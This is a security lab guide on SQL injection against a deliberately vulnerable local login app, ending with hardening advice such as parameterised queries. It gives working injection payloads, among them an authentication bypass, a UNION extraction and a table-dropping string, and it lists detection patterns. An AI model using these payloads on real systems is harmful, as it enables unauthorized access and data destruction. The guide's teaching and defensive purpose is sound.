# Lab 04 — SQL Injection (SQLi)

## 📖 Explanation

**SQL Injection** occurs when user input is concatenated directly into SQL
queries without sanitisation. An attacker can manipulate the query to:

- Bypass authentication
- Read arbitrary data from the database
- Modify or delete records
- Execute administrative operations (in extreme cases)

### The vulnerable code

In `app.py`, the login handler builds the query using f-strings:

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

If an attacker enters a carefully crafted string, they can change the SQL
logic.

---

## 🎯 Try It

### 1. Bypass login (classic trick)

Go to `/login` and enter:

- **Username:** `admin' --`
- **Password:** anything

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

The `--` comments out the password check. You're logged in as **admin**.

### 2. Login as any user

- **Username:** `' OR 1=1 --`
- **Password:** anything

Query: `SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'`

Returns **all** users — the app takes the first one (admin).

### 3. Extract data via blind SQLi (search bar)

If the app had a search endpoint that reflects results differently based on
query results, you could extract data character by character.

For a more direct example, try this in the **login form**:

- **Username:** `alice' UNION SELECT 1, 'attacker', 'pass', 'hacker@x.com', 'bio' --`
- **Password:** `pass`

This creates a UNION-based injection that returns arbitrary data as if it
were a user record.

### 4. Drop a table (destructive — not recommended in shared labs)

```sql
'; DROP TABLE notes; --
```

> ⚠️ This would delete all notes. In a real engagement, you'd only
> demonstrate impact with explicit permission.

---

## 🔍 Packet Inspection with mitmproxy

SQLi is very visible on the wire — the injected SQL syntax is right there
in the POST body.

### What to look for

**1. Normal login request**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:15000
Content-Type: application/x-www-form-urlencoded

username=alice&password=password1
```

**2. SQLi bypass request**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:15000

username=admin'--&password=anything
```

The body clearly shows the SQL comment sequence `--`. The server takes this
string and interpolates it directly into the SQL query.

**3. Tautology injection**

```http
username=' OR 1=1 --&password=x
```

You can see `OR 1=1` in plain text. This is the **smoking gun** of SQLi.

### Response comparison

| Request        | Response                      | Status |
| -------------- | ----------------------------- | ------ |
| Normal login   | Redirect to `/dashboard`    | 302    |
| Wrong password | Renders login page with error | 200    |
| SQLi bypass    | Redirect to `/dashboard`    | 302    |

The response is the same as a successful login — the server sees a valid
user row because the SQL injection made the WHERE clause always true.

### Use the addon

```bash
mitmweb -s mitm_addon.py
```

The addon automatically tags POSTs to `/login` that contain `--`, `OR 1=1`,
or `UNION SELECT` patterns.

---

## 🛡️ Hardening

### Fix 1 — Use parameterised queries (prepared statements)

**Vulnerable:**

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
con.execute(query)
```

**Fixed:**

```python
cur = con.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
```

With `?` placeholders, SQLite knows the values are **data**, not SQL.
This is the single most effective defence.

### Fix 2 — Use an ORM

```python
from flask_sqlalchemy import SQLAlchemy

# Models handle parameterisation automatically
user = User.query.filter_by(username=username, password=password).first()
```

### Fix 3 — Least privilege for the database user

Do not use the database owner account for the web app. Create a dedicated
user with only the permissions it needs (SELECT, INSERT on specific tables).

### Fix 4 — Input validation (defence-in-depth)

```python
import re
if not re.match(r'^[a-zA-Z0-9_]+$', username):
    return "Invalid username format", 400
```

This prevents injection but is **not sufficient alone** — always use
parameterised queries as the primary defence.

### Fix 5 — Use a WAF (Web Application Firewall) in production

A WAF can detect and block SQLi patterns before they reach the application,
but never rely on it as the only defence.

### Key takeaway

> **Parameterised queries** are the only reliable defence against SQLi.
> Never concatenate user input into SQL — ever.
